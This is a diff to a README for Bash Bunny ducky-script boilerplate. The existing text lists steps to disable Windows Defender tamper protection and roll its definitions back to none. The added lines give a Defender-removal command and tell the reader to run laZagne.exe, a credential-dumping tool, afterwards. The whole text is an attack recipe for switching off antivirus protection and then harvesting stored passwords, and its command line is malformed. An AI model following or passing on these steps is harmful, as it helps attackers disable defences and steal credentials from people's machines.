@@ -10,6 +10,9 @@ Boiler Plate for running ducky scripts on the Bash Bunny
 Disable TP (Tamper Protection) on Win 10 anti virus.  
 Launch Powershell as Administrator.  
 Roll back Win 10 Defender AV definitions to "none".  
+Need to disable Real Time Protection too, try:
+`MpCmdRun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true`
+Then run laZagne.exe All
 
 ## Configuration
 
